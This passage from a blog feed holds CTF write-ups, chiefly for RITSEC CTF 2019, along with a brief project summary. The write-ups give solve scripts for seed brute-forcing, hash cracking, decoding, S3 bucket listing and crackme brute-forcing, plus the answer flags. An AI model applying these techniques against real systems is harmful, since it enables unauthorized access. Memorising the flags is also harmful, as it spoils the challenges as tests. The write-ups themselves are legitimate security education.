&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;core_string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;)

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; core_string:
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(i) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag - &lt;code&gt;TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;That&amp;rsquo;s all for now :wave:.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Privacy-preserving Deep Learning for Medical Image Classification</title>
      <link>https://shreyansh26.github.io/project/privacy-ml/</link>
      <pubDate>Mon, 25 Nov 2019 17:53:33 +0530</pubDate>
      <guid>https://shreyansh26.github.io/project/privacy-ml/</guid>
      <description>&lt;p&gt;Privacy Preserving Deep Learning for Medical Image Classification to detect chest pneumonia in chest X-ray images.&lt;/p&gt;
&lt;p&gt;Uses TF-Encrypted to implement Secure Multiparty Computation (SMPC) and Differential Privacy. SMPC helps to provide secure predictions and Differential Privacy is used to enhance privacy.&lt;/p&gt;
&lt;p&gt;The base model is a VGG16 model which is made secure and privacy-preserving.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>RITSEC CTF 2019</title>
      <link>https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/</link>
      <pubDate>Tue, 19 Nov 2019 17:31:59 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/</guid>
      <description>&lt;p&gt;A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 IST — Mon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: The scripts to solve and the flags are present in &lt;a href=&#34;https://github.com/wr47h/CTF-Writeups/tree/master/2019/RITSEC%20CTF%202019&#34;&gt;this repo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll do the writeups category-wise -&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;pre-legend — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;9EEADi^⁸:E9F3]4@&amp;amp;gt;⁴=2J32==^D@&amp;amp;gt;6E9:?8\FD67F=\C:ED64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This is the provided cipher text. Since all of these are ASCII characters, we try a ROT of till say, 50.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/e3386cba7303cdcb24b01d552b16aad4.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;On i=47, we get — https\x98\x8d\x8dgithub\x8ccom\x8dclayball\x8dsomething\x8buseful\x8britsec&lt;/p&gt;
&lt;p&gt;There is a problem with the special characters, but we understand that is a GitHub repo, with the URL (after some testing) — &lt;a href=&#34;https://github.com/clayball/something-useful-ritsec&#34;&gt;https://github.com/clayball/something-useful-ritsec&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Although there is nothing flag related in the repo, but the discord group of the CTF said that the link itself is the flag.&lt;/p&gt;
&lt;p&gt;Flag —&lt;strong&gt;RITSEC{https://github.com/clayball/something-useful-ritsec}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Shiny — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given the following text, and an image
&lt;code&gt;.‡8]5);483‡5;&lt;/code&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://cdn-images-1.medium.com/max/800/0*szkUp3DoP0hYUlyx&#34; data-caption=&#34;gold-bug.jfif&#34;&gt;
&lt;img src=&#34;https://cdn-images-1.medium.com/max/800/0*szkUp3DoP0hYUlyx&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    gold-bug.jfif
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This did not hit me directly, so I had to do a bit of Googling. I found that this is a reference to a short story by Edgar Allan Poe, called The Gold Bug which involves a substitution cipher. I found an &lt;a href=&#34;https://www.dcode.fr/gold-bug-poe&#34;&gt;online tool&lt;/a&gt; for the same.&lt;/p&gt;
&lt;p&gt;This gives us the flag —&lt;strong&gt;RITSEC{POEWASTHEGOAT}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;random — 290 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After connecting to &lt;em&gt;nc ctfchallenges.ritsec.club 8001&lt;/em&gt; we find that we are presented with a series of numbers and we have to guess the next. The challenge title tells us that we have something to do with the &lt;strong&gt;random&lt;/strong&gt; function in the &lt;strong&gt;C&lt;/strong&gt; language, because of the hint,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Are you starting to &amp;lsquo;C&amp;rsquo; a pattern?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We make a guess that whenever we request that host and port, the random function is initialized with a certain seed and we are given the first five random numbers generated from that seed. So, I wrote a simple C code to bruteforce all unix timestamps from 15th Nov 2019, 00:00 UTC to 17th Nov. 2019 00:00 UTC, and check for the seed. The code is shown below —&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1573776000&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// 15th Nov 2019, 00:00 UTC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1573948800&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// // 17th Nov 2019, 00:00 UTC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;start; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;end; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        srand(i);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(a&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1068399227&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;161933545&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; c&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;741438783&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; d&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1951874661&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; e&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1076387813&lt;/span&gt;) {
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Seed: %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, i);
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Next: %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, f);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We provide the next number, and get the flag — &lt;strong&gt;RITSEC{404_RANDOMNESS_NOT_FOUND}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Crack me If You Can — 391 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this challenge, after connecting to &lt;em&gt;nc ctfchallenges.ritsec.club 8080&lt;/em&gt;, we find that we are presented with queries of hashes, and we have to break them in order to get the flag. They were NTLM and sha256 hashes. So, we used a combination of &lt;a href=&#34;http://crackstation.net&#34;&gt;crackstation.net&lt;/a&gt; and John the Ripper to crack both of them.&lt;/p&gt;
&lt;p&gt;We found the flag — &lt;strong&gt;RS{H@$HM31FY0UCAN}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Onion Layer Encoding — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The challenge says that the text is encoded using either Base16 or Baser32 or Base64 in a sequence. So we write a simple python script to solve it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onionlayerencoding.txt&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RITSEC&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; str(flag):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b16decode(flag)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b32decode(flag)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
            flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(flag)
            
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is — &lt;strong&gt;RITSEC{0n1On_L4y3R}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;AlPhAbEtIcAl Challenge - 100pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I couldn&amp;rsquo;t solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is —&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;59:87:57:51:85:80{:40:50:56:08:82:58:81:08:18:85:57:87:48:85:88:40:50:56:59:15:56:11:18:85:59:51:}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We see that the &amp;lsquo;{&amp;rsquo; and &amp;lsquo;}&amp;rsquo; are in place. So, this must represent the flag. The other numbers are assigned some alphabet starting from &amp;lsquo;A&amp;rsquo;. After this we see that we have the following — ABCDEF{GHIJKLMJNECBOEPGHIAQIRNEAD}.&lt;/p&gt;
&lt;p&gt;On this we use an online substitution solver like quipquip.com and also the fact that ABCDEF corresponds to RITSEC, we get the flag as — &lt;strong&gt;RITSEC{YOUALPHABETIZEDYOURNUMBERS}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;misdirection — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a URL — &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/&#34;&gt;http://ctfchallenges.ritsec.club:5000/&lt;/a&gt; However, on clicking it we see that we are directed to another webpage &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/n&#34;&gt;http://ctfchallenges.ritsec.club:5000/n&lt;/a&gt; and the information that the webpage isn&amp;rsquo;t redirecting properly. So, I decided to see what is happening, for that I did a simple &lt;em&gt;wget&lt;/em&gt; to the url.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/3.png&#34; data-caption=&#34;Running wget&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Running wget
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We see that the page redirects to different pages and keeps doing that. We note that the last character is basically in the flag format when put together. We do that and get the flag — &lt;strong&gt;RS{4!way5_Ke3p-m0v1ng}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Buckets of fun — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given the following URL — &lt;a href=&#34;http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/&#34;&gt;http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Taking a hint from the name of the challenge, we try the following URL in the browser —&lt;a href=&#34;http://bucketsoffun-ctf.s3.amazonaws.com&#34;&gt;http://bucketsoffun-ctf.s3.amazonaws.com&lt;/a&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/4.png&#34; data-caption=&#34;The webpage&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The webpage
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We see a file &lt;strong&gt;youfoundme-asd897kjm.txt&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Heading to &lt;a href=&#34;http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt&#34;&gt;http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt&lt;/a&gt; we find the flag — &lt;strong&gt;RITSEC{LIST_HIDDEN_FILES}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;forensics&#34;&gt;Forensics&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Take it to the Cleaners — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given an image&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/5.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/5.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Performing basic recon, we check the metadata for the image using exiftool.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/6.png&#34; data-caption=&#34;exiftool output&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    exiftool output
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;In the user comment, we see a string which is probably base64 encoded.&lt;/p&gt;
&lt;p&gt;Decoding it gives, &lt;strong&gt;EVGFRP{SBERAFVPF_SNVYF_JBAG_URYC_LBH_URER}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Looks rotated by an offset. We use &lt;a href=&#34;http://theblob.org/rot.cgi&#34;&gt;http://theblob.org/rot.cgi&lt;/a&gt; to get rotations by different offsets. This is ROT13 and the flag is — &lt;strong&gt;RITSEC{FORENSICS_FAILS_WONT_HELP_YOU_HERE}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Long Gone — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are provided a chromebin. Extract it as it is a tar archive.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tar xzvf ./chromebin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We see there are a lot of folders, on inspecting the history we find it is an SQLite 3.X database. Loading it into DBBrowser, and inspecting the tables, shows an odd URL — us-central-1.ritsec.club/l/relaxfizzblur&lt;/p&gt;
&lt;p&gt;Opening the url gives the flag — &lt;strong&gt;RITSEC{SP00KY_BR0WS3R_H1ST0RY}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;999 Bottles — 110 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given 999 ELF files, each having a password as a single character. Basically, 999 crackmes with a one character password. If we check the disassembly of main function of any one —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/7.png&#34; data-caption=&#34;The disassembly for main&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/7.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The disassembly for main
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;At 0x8048728 we see a comparison, where register edx (dl) stores our input character and eax (al) stores the value at address 0x804a039.&lt;/p&gt;
&lt;p&gt;Also, in the disassembly, we have some character mappings to addresses —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/8.png&#34; data-caption=&#34;Character mappings&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/8.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Character mappings
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;So, one way to solve this challenge is to get the address to be compared and check the character at this address and automate it somehow.&lt;/p&gt;
&lt;p&gt;During the CTF, however, I wrote a bruteforce script to try all characters for every ELF file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string

FOLDER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./elfs/&amp;#39;&lt;/span&gt;
filenames &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;punctuation

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
    filenames&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(i)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;zfill(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.c.out&amp;#39;&lt;/span&gt;)flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; filenames:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; s:
        p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(FOLDER&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;file)
        p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
        p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(inp)
        a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;OK!&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
            flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; inp
            p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FLAG: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag)
            f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FLAG: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag)
            f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
            
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FLAG: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we have the following string in the output generated -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;lr^wN${HnW&amp;lt;DtVjk.RITSEC{AuT057v}^W!xT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Note the string in the flag format, that is the flag — &lt;strong&gt;RITSEC{AuT057v}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A better way to solve it actually using the method described above. The following script can help do that -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; r2pipe  
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; binascii  
